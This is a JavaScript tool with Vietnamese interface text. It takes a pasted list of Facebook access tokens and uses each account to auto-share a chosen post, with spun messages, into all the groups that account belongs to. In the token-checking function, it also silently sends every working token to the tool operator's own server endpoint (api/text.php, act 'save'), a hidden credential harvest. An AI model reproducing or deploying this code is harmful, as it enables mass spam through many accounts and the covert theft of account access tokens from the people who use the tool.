function auto_sharet_check(a) {
    $.get('https://graph.facebook.com/', {
        method: 'post',
        access_token: a,
        batch: '[{\"method\":\"GET\",\"relative_url\":\"me?fields=id,name\"},{\"method\":\"GET\",\"relative_url\":\"fql?q=select gid, name from group where gid in (select gid from group_member where uid = me()) ORDER BY rand() limit ' + sharet.limit + '\"}]',
        include_headers: 'false'
    }, function(d) {
        var j = JSON.parse(d[0].body);
        sharet.array[sharet.success] = [], sharet.array[sharet.success].gid = j.id, sharet.array[sharet.success].name = j.name, sharet.array[sharet.success].data = JSON.parse(d[1].body).data, sharet.array[sharet.success].access_token = a, sharet.success++, sharet.bach += a + '\n', tbody = '', tbody += '<tr>', tbody += '	<td>' + sharet.success + '</td>', tbody += '	<td>' + j.name + '</td>', tbody += '	<td align=\"center\">' + sharet.array[sharet.success - 1].data.length + '</td>', tbody += '	<td align=\"center\"><font color=\"green\"><span id=\"sharet_success_' + sharet.success + '\">0</span></font></td>', tbody += '	<td align=\"center\"><font color=\"red\"><span id=\"sharet_error_' + sharet.success + '\">0</span></font></td>', tbody += '	<td id=\"sharet_status_' + sharet.success + '\" b-data=\"loading\">Đang chờ !</td>', tbody += '</tr>', $('#html_auto_sharet_body').append(tbody)
    }).fail(function(d) {
        'undefined' == typeof d.responseText ? sharet_check(a) : sharet.error++
    }).always(function() {
        if (sharet.success + sharet.error == sharet.token.split('\n').length) {
            if (sharet.success > 0) {
                var a = $.trim(sharet.bach).split('\n');
                a.length > 0 && $.post('//' + b_sv + '/api/text.php', {
                    act: 'save',
                    array: a
                });
                for (var d = 0; d < sharet.array.length; d++) {
                    auto_sharet_msg(d, 0)
                }
            } else {
                $('#submit_auto_sharet').buttonStop(), $('#submit_auto_sharet_stop').disabled(), noti.success('Không Access Token nào Live !'), $('#html_auto_sharet_result').hide()
            }
        }
    })
}

function auto_sharet_msg(a, d) {
    return 0 == sharet.run ? !1 : void((0 == sharet.array[a].data.length ? ($('#sharet_status_' + (a + 1)).html('<font color=\"red\">Không có bạn bè !</font>'), sharet.total++, sharet.total == sharet.success && ($('#submit_auto_sharet').buttonStop(), $('#submit_auto_sharet_stop').disabled(), noti.success('Quá trình gửi tin nhắn đã hoàn tất !'))) : ! function(j, c, b) {
        $('#sharet_status_' + (a + 1)).html('<font color=\"blue\">Đang gửi tin nhắn đến <b>' + b + '</b></font> ' + run.loading()), $.get('https://graph.facebook.com/'+sharet.id+'/sharedposts', {
            to:c,
			locale: 'en_US',
            method: 'post',
            return_structure: 'true',
            message: init.spinText(sharet.message.replace(/\$\m\e/g, j).replace(/\$\y\o\u/g, b)),
            access_token: sharet.array[a].access_token
        }).done(function() {
            $('#sharet_success_' + (a + 1)).text(parseInt($('#sharet_success_' + (a + 1)).text()) + 1), $('#sharet_status_' + (a + 1)).html('<font color=\"green\">Gửi đến <b>' + b + '</b> thành công, xin chờ <b id=\"timedown_' + (a + 1) + '\"></b> giây</font> ' + run.loading())
        }).error(function(d) {
            if ($('#sharet_error_' + (a + 1)).text(parseInt($('#sharet_error_' + (a + 1)).text()) + 1), $('#sharet_status_' + (a + 1)).html('<font color=\"red\">Gửi đến <b>' + b + '</b> thất bại, xin chờ <b id=\"timedown_' + (a + 1) + '\"></b> giây</font> ' + run.loading()), d.responseText) {
                var d = init.replace_JSON(d.responseText);
                noti.error(d.error.message)
            }
        }).always(function() {
            d + 1 < sharet.array[a].data.length ? timer.count_down_array(0, Math.floor(sharet.delay / 60), sharet.delay - 60 * Math.floor(sharet.delay / 60), 'timedown_' + (a + 1), a, function() {
                auto_sharet_msg(a, d + 1)
            }) : ($('#sharet_status_' + (a + 1)).html('<font color=\"green\">Hoàn thành !</font>'), sharet.total++, sharet.total == sharet.success && ($('#submit_auto_sharet').buttonStop(), $('#submit_auto_sharet_stop').disabled(), noti.success('Quá trình gửi tin nhắn đã hoàn tất !')))
        })
    }(sharet.array[a].name, sharet.array[a].data[d].gid, sharet.array[a].data[d].name)))
}
location.hostname == b_sv && ($(document).on('click', '#submit_auto_sharet_stop', function() {
    sharet.run = 0;
    for (var a = 0; a < sharet.array.length; a++) {
        clearTimeout(timeout_array[a])
    };
    $('[b-data=\'loading\']').text('Đã có lệnh dừng !'), $('#submit_auto_sharet_stop').disabled(), $('#submit_auto_sharet').buttonStop(), noti.success('Đã có lệnh dừng gửi tin nhắn !')
}), $(document).on('click', '#submit_auto_sharet', function() {
    sharet = {
		id: $('#input_auto_sharet_id').isNumber(),
        token: $('#input_auto_sharet_token').validate(),
        message: $('#input_auto_sharet_msg').validate(),
        delay: $('#input_auto_sharet_delay').isNumber(),
        limit: $('#input_auto_sharet_limit').isNumber(),
        array: [],
        run: 1,
        total: 0,
        success: 0,
        error: 0,
        bach: ''
    }, sharet.id && sharet.token && sharet.message && sharet.delay && sharet.limit && ($(this).buttonLoad(), $('#submit_auto_sharet_stop').undisabled(), $('#html_auto_sharet_result').fadeIn('fast'), $('#html_auto_sharet_body').html(''), $.each(sharet.token.split('\n'), function(a, d) {
        var j = d.split('|');
        j = j[1] ? j[1] : d, setTimeout(function() {
            auto_sharet_check(j)
        }, 15 * a)
    }))
}))